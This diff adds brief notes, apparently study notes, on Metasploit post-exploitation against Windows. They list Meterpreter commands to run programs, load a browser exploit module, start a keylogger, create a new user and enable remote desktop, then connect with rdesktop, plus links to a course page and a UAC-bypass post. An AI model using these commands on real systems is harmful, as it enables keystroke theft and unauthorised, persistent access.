@@ -1,0 +1,17 @@
+ 
+ - execute -f c:\\windows\\system32\\calc.exe
+ - meterpreter > execute -f calc.exe
+ - use exploit/windows/browser/adobe_toolbutton
+ - meterpreter> keyscan_start
+
+we can create a new user (with getgui -u "user" -p "password"), and enable a remote desktop (with getgui -e):
+
+- run getgui -u newuser -p pass
+
+- rdesktop -u newuser -p pass 10.200.0.205
+
+
+
+https://asecuritysite.com/subjects/chapter32
+
+https://sathisharthars.wordpress.com/2014/06/19/bypass-uac-and-get-admin-privilege-in-windows-7-using-metasploit/
